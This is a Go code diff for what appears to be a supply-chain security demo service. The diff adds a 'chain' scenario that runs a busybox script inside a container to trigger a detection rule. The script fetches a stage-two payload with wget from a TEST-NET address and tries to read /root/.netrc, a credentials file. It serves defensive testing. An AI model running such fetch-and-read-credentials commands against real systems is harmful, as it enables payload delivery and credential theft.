@@ -45,8 +45,8 @@ var packageFiles = map[string][]string{
 	benignPkg: {"setup.py", "README.md", "sg_demo_benign.py"},
 }
 
-// Scenarios: 허용 시나리오(순서는 화면 선택 목록과 같다). 11/04 benign(정상 설치 대조군)은 끝에 붙는다 — all 에는 들지 않는다
-var Scenarios = []string{"all", "shell", "revshell", "direct-ip", "domain", "dns-exfil", "benign"}
+// Scenarios: 허용 시나리오(순서는 화면 선택 목록과 같다). 11/04 benign(정상 설치 대조군) · chain(연쇄 규칙)은 끝에 붙는다 — all 에는 들지 않는다
+var Scenarios = []string{"all", "shell", "revshell", "direct-ip", "domain", "dns-exfil", "benign", "chain"}
 
 // Run 상태
 const (
@@ -57,23 +57,35 @@ const (
 	StatusRefused  = "refused"
 )
 
+// ChainScript: chain 시연(11/04) 컨테이너의 셸 본문 — deploy/demo/run-attacker.sh SCENARIO=chain 과 같은 동작(CHAIN_GAP=1 고정, 반복 · 대기 없음).
+// 무해: wget 은 TEST-NET(203.0.113.7, 라우팅 안 됨)이라 아무것도 받지 못하고, /root/.netrc 는 없는 파일이라 여는 시도만 한다.
+// 연쇄 규칙 chain-download-secrets 의 세 단계(exec wget → 내부망 밖 connect → open 자격 증명 경로)를 1~4초 안에 차례로 낸다.
+// TEST-NET 연결은 실패할 때(약 3초 뒤) connect 이벤트가 나오므로 파일 열기는 그 뒤 1초에 둔다(순서가 뒤집히지 않게)
+const ChainScript = `echo "[demo] chain start"
+timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2 || true
+sleep 1
+cat /root/.netrc >/dev/null 2>&1 || true
+echo "[demo] chain done"`
+
 const (
-	DefaultImage   = "python:3.12-slim"
-	DefaultTimeout = 90 * time.Second
-	manager        = "pip"
-	pkgRoot        = "/pkg/"            // PUT archive 로 올린 패키지 위치 /pkg/<패키지>
-	demoLabel      = "supplyguard.demo" // 컨테이너 라벨 supplyguard.demo=install
-	exitKilled     = 137                // SIGKILL 로 격리된 컨테이너(mock 재생이 kill 로 끝났을 때)
-	exitTimeout    = 124                // 시간 초과(timeout(1) 관례)
-	exitFailed     = -1                 // 컨테이너를 만들거나 띄우지 못함
-	createTimeout  = 3 * time.Minute    // 이미지 pull 포함
-	stepTimeout    = 30 * time.Second   // archive · start · remove · finish
+	DefaultImage = "python:3.12-slim"
+	// DefaultChainImage: chain 시연 이미지 — wget · timeout · sleep · cat 이 든 busybox(run-attacker.sh 와 같은 계열, 태그 고정)
+	DefaultChainImage = "busybox:1.36"
+	DefaultTimeout    = 90 * time.Second
+	manager           = "pip"
+	pkgRoot           = "/pkg/"            // PUT archive 로 올린 패키지 위치 /pkg/<패키지>
+	demoLabel         = "supplyguard.demo" // 컨테이너 라벨 supplyguard.demo=install
+	exitKilled        = 137                // SIGKILL 로 격리된 컨테이너(mock 재생이 kill 로 끝났을 때)
+	exitTimeout       = 124                // 시간 초과(timeout(1) 관례)
+	exitFailed        = -1                 // 컨테이너를 만들거나 띄우지 못함
+	createTimeout     = 3 * time.Minute    // 이미지 pull 포함
+	stepTimeout       = 30 * time.Second   // archive · start · remove · finish
 )
 
 // Run: 시연 실행 1건 — GET /api/demo 의 running · last, POST 의 202 본문
 type Run struct {
 	ID         string     `json:"id"`        // demo-<unix>
-	Scenario   string     `json:"scenario"`  // all | shell | revshell | direct-ip | domain | dns-exfil | benign
+	Scenario   string     `json:"scenario"`  // all | shell | revshell | direct-ip | domain | dns-exfil | benign | chain
 	Container  string     `json:"container"` // sg-install-demo-<unix>
 	InstallID  string     `json:"installId"`
 	StartedAt  time.Time  `json:"startedAt"`
@@ -137,6 +149,8 @@ type Options struct {
 	Simulator Simulator
 	// Image: 시연 컨테이너 이미지 (SG_PIP_IMAGE, 기본 python:3.12-slim)
 	Image string
+	// ChainImage: chain 시연 이미지 (기본 busybox:1.36)
+	ChainImage string
 	// Timeout: 컨테이너(또는 재생) 종료 대기 상한 (기본 90초)
 	Timeout time.Duration
 	Now     func() time.Time
@@ -159,6 +173,9 @@ func New(o Options) *Service {
 	if o.Image == "" {
 		o.Image = DefaultImage
 	}
+	if o.ChainImage == "" {
+		o.ChainImage = DefaultChainImage
+	}
 	if o.Timeout <= 0 {
 		o.Timeout = DefaultTimeout
 	}
@@ -174,13 +191,18 @@ func ValidScenario(s string) bool { return slices.Contains(Scenarios, s) }
 // plan: 시나리오가 정하는 실행 — 세션 패키지 인자 · 임베드 패키지 · 이미지 · 명령 · 환경. 모두 서버 상수(사용자 입력 아님)
 type plan struct {
 	pkgArg string   // 세션 패키지 인자 — 라벨 「pip ./<패키지>」 · 차단 확인 키 pip:<패키지> (sg-install pip ./deploy/demo/<패키지> 와 같다)
-	pkgDir string   // PUT archive 로 올릴 임베드 패키지
+	pkgDir string   // PUT archive 로 올릴 임베드 패키지 — 비면 올리지 않는다(chain)
 	image  string   // 컨테이너 이미지
 	cmd    []string // 컨테이너 명령
 	env    []string
 }
 
 func (s *Service) planFor(scenario string) plan {
+	if scenario == "chain" {
+		// 연쇄 규칙 시연: pip 설치가 아니라 reqeusts 가 깔린 뒤 런타임에 하는 짓을 busybox 셸로 재현한다(run-attacker.sh SCENARIO=chain).
+		// 세션 패키지는 reqeusts 그대로 — 차단 목록에 있으면 다른 공격 시나리오처럼 거부된다
+		return plan{pkgArg: "./" + attackPkg, image: s.o.ChainImage, cmd: []string{"sh", "-c", ChainScript}}
+	}
 	if scenario == "benign" {
 		// 정상 설치 대조군: 공격 패키지와 다른 패키지라 pip:reqeusts 차단과 상관없이 돈다. 시나리오 환경 변수는 없다
 		return plan{pkgArg: "./" + benignPkg, pkgDir: benignPkg, image: s.o.Image, cmd: pipInstall(benignPkg),
@@ -362,14 +384,16 @@ func (s *Service) execute(run Run, sess model.InstallSession) {
 		}
 		return true
 	}
-	tarb, err := archivePackage(p.pkgDir)
-	if err != nil {
-		slog.Error("demo: package archive", "err", err)
-		end(StatusFailed, exitFailed)
-		return
+	var tarb []byte
+	if p.pkgDir != "" {
+		if tarb, err = archivePackage(p.pkgDir); err != nil {
+			slog.Error("demo: package archive", "err", err)
+			end(StatusFailed, exitFailed)
+			return
+		}
 	}
-	// 시작 전에 패키지를 컨테이너 안 /pkg/<패키지> 로 올린다 — 호스트 경로 의존 없음. tar 는 pkg/<패키지>/… 라 '/' 에 푼다
-	if !step("put archive", func(c context.Context) error { return s.o.Docker.PutArchive(c, cid, "/", bytes.NewReader(tarb)) }) ||
+	// 시작 전에 패키지를 컨테이너 안 /pkg/<패키지> 로 올린다 — 호스트 경로 의존 없음. tar 는 pkg/<패키지>/… 라 '/' 에 푼다. 패키지가 없는 시나리오(chain)는 건너뛴다
+	if (tarb != nil && !step("put archive", func(c context.Context) error { return s.o.Docker.PutArchive(c, cid, "/", bytes.NewReader(tarb)) })) ||
 		!step("start container", func(c context.Context) error { return s.o.Docker.StartContainer(c, cid) }) {
 		end(StatusFailed, exitFailed)
 		return
